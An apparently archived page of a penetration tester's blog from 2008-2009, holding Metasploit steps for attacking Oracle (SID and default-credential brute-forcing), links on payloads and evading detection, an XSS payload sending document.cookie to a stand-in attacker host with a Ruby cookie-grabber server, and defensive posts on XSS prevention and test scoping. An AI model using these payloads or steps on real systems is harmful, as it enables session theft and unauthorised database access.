@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Raesene's Ramblings</title>
+	
+	<meta name="author" content="raesene">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/raesene">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/raesene">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="http://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="http://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Security Geek, Penetration Testing, Ruby, Hillwalking
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Raesene's Ramblings </h1>
+</div>
+
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    May
+    10th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/05/10/some-metasploit/">Some Metasploit and Oracle Notes - Part 1</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>Todays fun with Metasploit is exploiting Oracle...  There's lots of good information on this on the <a href="http://carnal0wnage.blogspot.com">Carnal 0wnage</a> blog and the metasploit page for <a href="http://metasploit.com/users/mc/">mc</a>.<br />
+First things first, we'll need the relevant ruby modules (dbi and oci8) installed and working for some of this.<br />
+dbi can be installed using the usual 'sudo gem install dbi' but oci8 has some more prerequisites and steps to get working.  The best thing to do is follow the instructions <a href="http://ruby-oci8.rubyforge.org/en/InstallForInstantClient.html">here </a>.  As a note you'll probably want to add the LD_LIBRARY_PATH to your bash profile to avoid setting it manually every time you want to use it (in Ubuntu this can be done system wide in /etc/bash.bashrc)<br />
+Once you've done that it should be possible to make basic connections to oracle from ruby ok...<br />
+So on to what Metasploit can do for you in a test with Oracle systems..  This walkthrough is heavily based on this video <a href="http://carnal0wnage.blogspot.com/2009/02/attacking-oracle-with-metasploit.html">here</a> from shmoocon this year.<br />
+One set of rough steps for converting "hmm there's an oracle system here" to "w00t I've got admin access to the server" might be</p>
+<ol>
+<li>Discover the version of Oracle Running</li>
+<li>Find out what the SID of the database is</li>
+<li>Get valid credentials to the database</li>
+<li>Escalate those credentials to DBA level access</li>
+<li>Leverage Oracles functionality to get access to the underlying operating system</li>
+<li>...</li>
+<li>Profit!!</li>
+</ol>
+<p>Luckily Metasploit can help us with pretty much all of this....</p>
+<p><b>1. Discover the version of Oracle running on the server</b><br />
+This is very useful as it allows for targeting of exploits (no point in trying use an exploit for something that's been patched on the target).  </p>
+<p>From msfconsole</p>
+<pre>use auxiliary/scanner/oracle/tnslsnr_version </pre>
+<pre>set RHOSTS [your_target_ip_here]
+run </pre>
+<p>from this you should see something like</p>
+<pre>[*] Host 192.168.1.203 is running: Linux: Version 10.2.0.1.0 - Production
+[*] Auxiliary module execution completed
+</pre>
+<p>which tells us we've got 10gR2 on Linux running.</p>
+<p><b>2. Find out what the SID of the database is</b><br />
+In order to connect to the database we're going to need to know what the SID is.  Pre 10GR2 we could just use the metasploit sid_enum module (in auxiliary/scanner/oracle) to find this but after that we'll need to brute-force it.  Not to worry there's a module for that too :)</p>
+<p>As of 3.3-dev 6537 the sid_brute module doesn't appear to be included, but it can be downloaded from <a href="http://metasploit.com/users/mc/oracle/sid_brute.rb">mc's page</a>.  For this module you'll also need a list of common SIDs for Oracle.  One of those can be found on the<a href="http://www.red-database-security.com/scripts/sid.txt"> Red Database Security</a> site.<br />
+so once you've put the sid_brute module in the right place (I used modules/auxiliary/scanner/oracle) and your sid.txt file somewhere (I used the default from the module of data/exploits) you can do the following...</p>
+<pre> use auxiliary/scanner/oracle/sid_brute</pre>
+<pre> set RHOST [your_target_ip_here]</pre>
+<p>and hopefully you'll get some output like</p>
+<pre>[*] Found SID 'ORCL' for host 192.168.1.203.</pre>
+<p>So we've now got the SID of the database, on to usernames and passwords.</p>
+<p><b>3. Get valid credentials to the database</b><br />
+Now Oracle databases are pretty notorious for having a wide range of default usernames and passwords installed on them.  This isn't so true for modern releases but if your're running against older releases, it's well worth checking. </p>
+<p>So to do this we'll need the brute_login metasploit module and a list of usernames and passwords.  The module again can be found on <a href="http://metasploit.com/users/mc/oracle/brute_login.rb">mc's page</a> and the canonical list of Oracle usernames and passwords is on <a href="http://www.petefinnigan.com/default/oracle_default_passwords.csv">Pete Finnigans</a> site.</p>
+<p>Also we'll need to get the oracle mixin at this point from <a href="http://metasploit.com/users/mc/oracle/oracle.rb">here</a> and copy that to lib/msf/core/exploit/ .  Now at this point I was getting a module loading error but reading <a href="http://carnal0wnage.blogspot.com/2008/11/oracle-pwnage-with-metasploit-oracle.html">this</a> and <a href="http://carnal0wnage.blogspot.com/2008/08/metasploit-and-file-format-bugs.html">this</a> led me to the idea of modifying the brute_login.rb file adding</p>
+<pre>require 'msf/core/exploit/oracle'</pre>
+<p>to the top of the file (just under the other requires) to get it all loaded up ok (also found out that a lot of this ground's been covered before but hey :) ! )</p>
+<p>So with those saved in appropriate places (same as last time) we can see what's there</p>
+<pre>use auxiliary/scanner/oracle/brute_login </pre>
+<pre> set RHOST [your_target_ip_here]
+run</pre>
+<p>Now wtih any luck you'll get a file called oracle_success.log popping up in the data/exploits directory which will contain some entries like this</p>
+<pre>Found user/pass of: SCOTT/TIGER on 192.168.1.203...</pre>
+<p>which tells us the creds we need to make a valid connection and move on to the next stage.<br />
+So now we've got a valid account on the database, but it's not got that magic DBA level of privilege<br />
+Next time I'll follow-up on using metasploit to get down the OS</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    May
+    7th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/05/07/tonights-metasp/">Tonights Metasploit links</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>Been taking a look at another one of the newer Metasploit features tonight.  WMAP is looking to integrate web application scanning functionality into Metasploit.  There's a couple of good overviews <a href="http://trac.metasploit.com/browser/framework3/trunk/documentation/wmap.txt">Here</a>, <a href="http://www.vulnerabilityassessment.co.uk/wmap_meta.htm">Here</a>  and <a href="http://darkoperator.blogspot.com/2008/10/metasploit-wmap-web-attack-and.html">Here</a><br />
+Getting it up and running is a little bit finicky at the moment, as you need to used a patched copy of <a href="http://code.google.com/p/ratproxy/">ratproxy</a> to collect the base URLs for the scanner (quick note is that my fairly new Ubuntu Intrepid install was missing libssl-dev which is a pre-requisite for compiling ratproxy so worth checking for if you get make errors when setting it up).<br />
+Once you've gathered URLs and fed them in to the database getting the scanner to start running is straightforward (examples in the links at the top so I won't go into it).  From an initial look, some of the plugins seem to do some directory/file brute-forcing which can take ages to run, but if it's going on too long you can use CTRL-C to interrupt just that plug-in and Metasploit will catch the interrupt gracefully and move on to the next directory or plugin...</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    May
+    5th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/05/05/more-metasploit/">More metasploit resources</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>So another night of metasploitage, and some good additional info<br />
+<b>Pivoting</b></p>
+<ul>
+<li><a href="http://www.indepthdefense.com/2009/02/reverse-pivots-with-metasploit-how-not.html">Good write-up on some of the challenges with pivoting</a></li>
+<li><a href="http://ne0matrix.blogspot.com/2009/05/demo-video-meterpreter-pivot-attack.html">Greate Demo video of using pivoting to attack a host indirectly</a></li>
+<li><a href="http://vimeo.com/3446123">Another good video demo of pivoting, but without the cool tunes :) </a></li>
+</ul>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    May
+    4th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/05/04/metasploit-reso/">Metasploit Resources</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>So I've been playing a bit with Metasploit over the holiday weekend (hey what are days off for..), and as usual when researching stuff, I've come across a load of links I don't want to lose track of, so I'll put them up here, may be useful to someone else as well..<br />
+I'll refrain from the really obvious linking to the project homepage, as if you're looking for metasploit links, I'd guess you've found it already :)<br />
+<b>Pre-Exploitation Information</b></p>
+<ul>
+<li><a href="http://synjunkie.blogspot.com/2008/10/metasploit-payloads-msfpayload.html"> Good set of examples for using msfpayload to create executable payloads</a></li>
+<li><a href="http://sites.google.com/site/visitabhiluck/Home/technical-writing/creating-malicious-executables-using-metasploit">More msfpayload information</a></li>
+<li><a href="http://www.darkoperator.com/blog/2009/4/25/evil-packaging-on-osx-with-xcode-and-metasploit.html">Interesting worked example of msfpayload setup on osx</a></li>
+<li><a href="http://www.gamelinux.org/?cat=17">Interesting write-up on eval_php for for webserver compromise</a></li>
+</ul>
+<p><b>Post-Exploitation (meterpreter and the like) Information</b></p>
+<ul>
+<li><a href="http://carnal0wnage.blogspot.com/2009/04/more-on-working-with-incognito-and.html">Post on meterpreter usage</a>.  Has some interesting points on what can be done with Meterpreter.</li>
+<li><a href="http://www.kecoak-elektronik.net/log/2009/03/01/fun-and-profit-with-meterpreter/"> Interesting post on using meterpreter again</a> Some information on using meterpreter scripts like killav to stop exploits being detected, and timestomp to make discovery harder.</li>
+<li><a href="http://sites.google.com/site/visitabhiluck/Home/technical-writing/post-exploitation-activities"> Article from the Metasploit wikibook on post-exploitation activities</a></li>
+</ul>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    March
+    31st,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/03/31/rack-for-pen-te/">Rack for Pen Testing</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>One of the many things I got introduced to at Scotland on Rails was the <a href="http://rack.rubyforge.org/">Rack project</a>.  Designed to help create flexible web application deployments, it creates an interface between webservers and ruby web app. frameworks (rails, sinatra etc).<br />
+Reading some of the examples, it occurred to me that Rack could be pretty handy for web application testing where sometimes it's useful to have a minimal web application to bounce things off.<br />
+One example of this is demo'ing XSS attacks.  A standard XSS attack is cookie stealing.  The way this works is the attacker inserts a script tag with a reference to a URL controlled by the attacker and inserts the cookie for the victim site into a parameter to the URL.<br />
+So for example if we've found an XSS vector we can put</p>
+<pre>
+&lt;script&gt;document.location=&quot;http://&lt;attacker_ip/cookiegrabber?cookie=&quot;+document.cookie&lt;/script&gt;
+</pre>
+<p>into the vulnerable box and if we have a server listening on that IP address we get the cookie..<br />
+Here's where rack comes in.  You can use rack to very quickly create some code to listen on a port and accept the incoming request (and indeed to anything else you can do with ruby, but hey lets start small).<br />
+A proof of concept script to do something like this might look like the one below...</p>
+<pre>
+#!/usr/bin/env ruby
+require 'rubygems'
+require 'rack'
+builder = Rack::Builder.new do
+use Rack::CommonLogger
+@@grabbed = Array.new
+map '/' do
+run Proc.new {|env| [200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;&lt;h1&gt; Rack Pen Test Helper&lt;/h1&gt;&quot;]}
+end
+map '/cookiegrabber' do
+app = proc do |env|
+req = Rack::Request.new(env)
+ip = req.ip.to_s
+cookie = req.params['cookie'] || &quot;No Cookie Parameter passed&quot;
+@@grabbed &lt;&lt; [ip,cookie]
+[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;grabbed &quot; + cookie + &quot; from &quot; + ip + &quot;&lt;br /&gt; Grabbed &quot; + @@grabbed.length.to_s + &quot; cookies so far&quot;]
+end
+run app
+end
+map '/cookiegrabbed' do
+app = proc do |env|
+out = &quot;&quot;
+if @@grabbed.length &gt; 0
+@@grabbed.each do |crumb|
+out &lt;&lt; &quot;Grabbed a cookie with value  &quot; + crumb[1] + &quot; from &quot; + crumb[0] + &quot;&lt;br /&gt;&quot;
+end
+else
+out = &quot;Nothing Grabbed so far&quot;
+end
+[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, out]
+end
+run app
+end
+end
+Rack::Handler::Mongrel.run builder, :Port =&gt; 9292
+</pre>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    March
+    31st,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/03/31/scotland-on-rai/">Scotland on Rails - Web Application Security</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>It was the <a href="http://www.scotlandonrails.com">Scotland on Rails</a> 2009 conference on Friday/Saturday of last week.  A great couple of days with loads of interesting Ruby and Rails talks (I'm planning more of a recap once the videos are out)<br />
+I presented on Web Application Security (slides <a href="http://www.slideshare.net/raesene/web-appliction-security-scotland-on-rails-presentation"> here</a>), which seemed to go down reasonably well.<br />
+One of the main themes of my presentation was that, whilst Rails provides a variety of mechanisms to help developers to create secure applications, it still leaves a lot to the individual to think about, and relies on implementation of the protection that it provides.<br />
+One major example of this it Rails default protection mechanism from XSS which is the h() function.  This HTML encodes the contents of the argument passed to it.  This is an effective defense against XSS but relies on developers to use it consistently, which can be tricky to remember.<br />
+There's a couple of potential ways for improving this situation with plugins.<br />
+The <a href="http://rubyforge.org/projects/safe-erb/">Safe ERB</a> plugin is designed to help developers by raising an exception when information pulled from an ActiveRecord model is displayed in a view without h() being used.<br />
+The other way to approach the problem of XSS is to validate input when it's passed to the application.  There are a number of Rails plugins which take this approach including  <a href="http://code.google.com/p/sanitizeparams/">Sanitize Params</a> and <a href="http://code.google.com/p/xssterminate/">XSS Terminate</a></p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    March
+    25th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/03/25/thoughts-on-sec/">Thoughts on Secure Data Handling in web applications...</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>I had an interesting conversation/debate over on <a href="http://www.reddit.com/r/programming/comments/86kgp/xss_cross_site_scripting_prevention_cheat_sheet/c08g0ol?context=3">reddit</a> today on the topic of input handling and I thought it was worth posting up.<br />
+Essentially there are two approaches handling data in an web applications.<br />
+1. Carry out input validation as the data enters your application.  This can either be white-list (only allow "known good" data types), or black-list (try to block "known-bad" data types)<br />
+2.  Carry out output normalization on the data as it leaves your application.  Here you look to understand the special or "meta" characters for the type of system or data format that you are outputting to and ensure that the data is encoded or rendered in such a way that it can't have a negative effect on that output system.<br />
+So which of these approaches is better?  Well my view on that after my discussion is that they both have pros and cons, which need to be considered before making a choice.<br />
+<u><strong><big>Input Validation</big></strong></u></p>
+<p><b>Pros:</b> The advantage of white list input validation is that, in a lot of cases, you can relatively easily cut down the number of attacks that will be effective against an application with minimal effort.  For example if you're not taking in mark-up (eg, HTML) in any part of your application then stripping or blocking the &lt; and &gt; characters from your input will drastically reduce your exposure to Cross Site Scripting.  This is the approach that .NET request validation takes.</p>
+<p><b>Cons:</b>The problem with input validation is, it can never take account of all possibilities.  It's impossible to know when you take input into the application, how that data will be used and exactly where it will be processed in future, so there's always a risk that it will miss some class of character which turns out to be important to a given format</p>
+<p><u><strong><big>Output Normalization</big></strong></u></p>
+<p><b>Pros: </b>So essentially the opposite applies.  The advantage of output normalization is that it can take into consideration the exact nature of the system that the data is being passed to and can ensure that the data it's passing will not have a negative effect.  This kind of approach can be seen in HTML encoding function like h() in Ruby on Rails.</p>
+<p><b>Cons: </b>Essentially for me the major downside here is a practical one.  A security control that needs to be implemented many times to be effective is one that is likely to be forgotten and because under ordinary conditions the application is likely to behave perfectly even though the control isn't in place, a developer may well not notice the problem until it's too late.  You can see this kind of effect in a lot of web applications.  I've seen many cases where the obvious areas of the application (form fields) have been covered for things like Cross Site Scripting, but more obscure areas (drop-downs, cookies, HTTP headers) get missed out, either because the developer forgets, or because they don't realise that those areas of the application are susceptible to attack</p>
+<p>So which of these approaches would I recommend..... Well I'm a security person, so I'll say <b><i>Both</i></b> for defence in depth!<br />
+Beyond that I'd say that Input validation is a great first step and will cut down the practical attacks greatly, but if you're looking for a "perfect" approach then you'll need to add output normalization to the mix...</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    March
+    8th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="/blog/2009/03/08/xss-in-rails/">XSS in Rails Applications</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>I'm doing some research at the moment for a presentation I'm doing for the <a href="http://www.scotlandonrails.com/">Scotland on Rails</a> conference, later this month.  As part of that I've been downloading some sample Rails applications to get an idea of common security issues that I can discuss.<br />
+Interestingly on popular applications that I've downloaded so far, I'm 2 for 2 on the exact same problem.<br />
+Both of them have XSS vulnerabilities from the user--&gt;admin sides of the site.  So the end-user pages have output encoding to restrict XSS but the admin sections don't consistently provide the same protection.<br />
+It's also interesting that both applications seem to be relying on output encoding as a defence as opposed to input validation.  In my experience the best defence is a combination of the two...<br />
+Of course that leads to some potentially nasty exploits around stealing admin credentials from the site in question.  Hey looks like I'll have some stuff to talk about anyway :)</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    December
+    22nd,
+    
+    2008
+  </span>
+
+  <h2>
+    <a href="/blog/2008/12/22/penetration-tes/">Penetration Test Scoping</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>Got a reminder I've not blogged in a while, so here's the next part of what I was going to talk about..<br />
+So, following on from my <a href="http://www.mccune.org.uk/blog/000508.html">first post</a> in this series I thought I'd go on to talk about penetration test scoping.<br />
+Getting the scope right is one of the most important parts of a successful pen. test.  If you get the wrong scope it won't matter how brilliantly the test is executed or how great the report looks, because you won't have fulfilled the customers requirements.<br />
+Unfortunately in a lot of cases the customer doesn't actually know what they want, they may have heard that they need "one of those security test things", they may have auditors telling them they have to have one, or if you're lucky they may have an idea of what they're looking to achieve.<br />
+The best pen. tests have specific goals in mind, which allow specific tests to be scoped.  Most commonly a good scope will focus on the question "what's changed", along with a view of the level of security desirable for an application.<br />
+So a high risk new application on a new platform is likely to warrant a fairly heavy review (web application, possibly code review, likely config. security review of the operating system and other new components like firewalls or routers), whereas some new pages added to an existing application where it's purely static content, might not warrant a review at all (or a very quick sense check).<br />
+Ultimately there's going to be a trade-off between time spent and the level of assurance over security that's needed.  A full code-review/manual build review/architecture review of a new application is likely to provide the best level of assurance, but at a pretty high cost.  A "black box" vulnerability scan and web application test, will likely be quick and therefore cheaper, but will provide a lower level of assurance.<br />
+next time (hopefully sooner) I'll talk about some of the challenges in executing tests and touch on some of the gotchas that can cause problems</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    December
+    14th,
+    
+    2008
+  </span>
+
+  <h2>
+    <a href="/blog/2008/12/14/what-is-penetra/">What is Penetration Testing?</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>I'm planning to do a series of posts about penetration testing over the next couple of weeks so I thought I should start in the obvious place of defining what it actually is.<br />
+You'd think this would be relatively straightforward, but the term "penetration testing" is mis-used all over the place.  Some people use it to refer to vulnerability assessment, some people use it to refer to Web Application Security Assessment, and a lot of business people use it to refer generically to any and all security assessment activity.<br />
+So what actually is it?  Well for me, a penetration test is a scenario based assessment where the tester will actually try to exploit security vulnerabilities in a system or systems (depending on the scope) and then leverage those exploited vulnerabilities to gain further access to systems within the scope of the assessment which may be accessible after exploiting the initial vulnerability.<br />
+So that's what it is, why is it important to use the term correctly?<br />
+Well, different security assessment types have different characteristics and provide the owner of the system with different levels of assurance, so it's important to make sure everyone's talking about the same thing.<br />
+For example, vulnerability assessment is typically primarily tool based (eg, Nessus), focuses on networking/Operating System/maybe database level problems and doesn't usually exploit the vulnerabilities found.  Pretty low risk to the systems under test (usually) but won't provide definite confirmation of problems and typically doesn't look at web applications, so it won't cover all the attack surface of a typical web application exposed over the Internet.<br />
+So if someone calls a vulnerability assessment a penetration test (and this is pretty common, in my experience) there's a good chance that someone's going to be disappointed in the results...<br />
+From the definition I used there's a couple of areas that can be very important to define correctly when conducting a test, so next time, I'm planning to go over some of the common problems and misconceptions in scoping penetration tests.</p>
+
+    
+    
+  </div>
+
+</article>
+
+<hr/>
+
+<ul class="pager"> 
+
+  
+  <li class="previous">
+    
+    <a href="/page6">&larr; Newer</a>
+    
+  </li>
+  
+  
+  <li>
+    <span class="page_number">Page: 7 of 47</span>
+  </li>
+
+  
+  <li class="next">
+    <a href="/page8">Older &rarr;</a>
+  </li>
+  
+
+</ul>
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2015 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
